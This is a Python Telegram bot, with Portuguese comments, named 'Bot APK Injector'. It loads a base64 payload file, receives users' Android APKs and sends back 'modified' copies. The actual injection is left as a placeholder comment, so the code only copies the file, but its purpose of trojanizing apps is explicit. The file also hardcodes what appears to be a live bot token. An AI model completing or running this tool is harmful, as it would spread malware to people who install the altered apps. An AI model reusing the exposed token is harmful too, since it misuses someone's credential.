import os
import logging
import base64
import subprocess
import tempfile
import shutil
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
from telegram.constants import ParseMode

# ==================== CONFIGURAÇÃO ====================
TOKEN =  "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A" # ← COLOQUE SEU TOKEN AQUI
PAYLOAD_FILE = "payload.b64"

# ==================== LOGGING ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== FUNÇÃO PARA CARREGAR PAYLOAD ====================
def load_payload():
    """Carrega o payload do arquivo externo"""
    try:
        if not os.path.exists(PAYLOAD_FILE):
            logger.error(f"❌ Arquivo não encontrado: {PAYLOAD_FILE}")
            return None
        
        with open(PAYLOAD_FILE, 'r', encoding='utf-8') as f:
            base64_content = f.read().strip()
        
        if not base64_content:
            logger.error("❌ Arquivo vazio")
            return None
        
        payload_bytes = base64.b64decode(base64_content)
        logger.info(f"✅ Payload carregado: {len(payload_bytes)} bytes")
        return payload_bytes
        
    except Exception as e:
        logger.error(f"❌ Erro: {e}")
        return None

# Carrega o payload
PAYLOAD = load_payload()

# ==================== VERIFICAÇÃO ====================
def check_payload():
    return PAYLOAD is not None

# ==================== COMANDOS ====================
async def start(update: Update, context: CallbackContext):
    status = "✅" if check_payload() else "❌"
    
    keyboard = [
        [InlineKeyboardButton("📤 Enviar APK", callback_data='send_apk')],
        [InlineKeyboardButton("ℹ️ Status", callback_data='status')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🤖 Bot APK Injector\n"
        f"Status payload: {status}\n\n"
        f"Envie um APK para processar.",
        reply_markup=reply_markup
    )

async def status(update: Update, context: CallbackContext):
    if not check_payload():
        await update.message.reply_text(
            "❌ PAYLOAD NÃO ENCONTRADO!\n\n"
            "O arquivo payload.b64 não está no servidor.\n"
            "Contate o administrador."
        )
        return
    
    tamanho = len(PAYLOAD) / (1024 * 1024)
    await update.message.reply_text(
        f"✅ Sistema OK\n"
        f"📦 Payload: {tamanho:.2f} MB\n"
        f"📁 Arquivo: {PAYLOAD_FILE}"
    )

async def handle_apk(update: Update, context: CallbackContext):
    if not check_payload():
        await update.message.reply_text("❌ Payload não disponível!")
        return
    
    if not update.message.document:
        await update.message.reply_text("❌ Envie um arquivo APK.")
        return
    
    document = update.message.document
    if not document.file_name.lower().endswith('.apk'):
        await update.message.reply_text("❌ Envie um arquivo .apk válido.")
        return
    
    await update.message.reply_text("📥 Baixando APK...")
    
    try:
        file = await document.get_file()
        input_path = tempfile.mktemp(suffix='.apk')
        await file.download_to_drive(input_path)
        
        await update.message.reply_text("🔄 Processando...")
        
        # AQUI VOCÊ COLOCA SEU CÓDIGO DE INJEÇÃO REAL
        # Exemplo:
        output_path = tempfile.mktemp(suffix='_modified.apk')
        
        # Simula processamento (substitua pelo seu código real)
        import time
        time.sleep(3)
        
        # Copia o arquivo como exemplo
        shutil.copy2(input_path, output_path)
        
        await update.message.reply_text("✅ APK processado!")
        with open(output_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=f'modified_{document.file_name}',
                caption="✅ APK modificado!"
            )
        
        # Limpa arquivos
        os.remove(input_path)
        os.remove(output_path)
        
    except Exception as e:
        logger.error(f"Erro: {e}")
        await update.message.reply_text(f"❌ Erro: {str(e)[:200]}")

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'send_apk':
        await query.message.reply_text("📤 Envie o arquivo APK.")
    elif query.data == 'status':
        await status(update, context)

async def error_handler(update: Update, context: CallbackContext):
    logger.error(f"Erro: {context.error}")

# ==================== MAIN ====================
def main():
    logger.info("🚀 Iniciando bot...")
    
    if PAYLOAD is None:
        logger.warning("⚠️ Payload não carregado!")
    else:
        logger.info(f"✅ Payload carregado: {len(PAYLOAD)} bytes")
    
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_error_handler(error_handler)
    
    logger.info("✅ Bot rodando...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()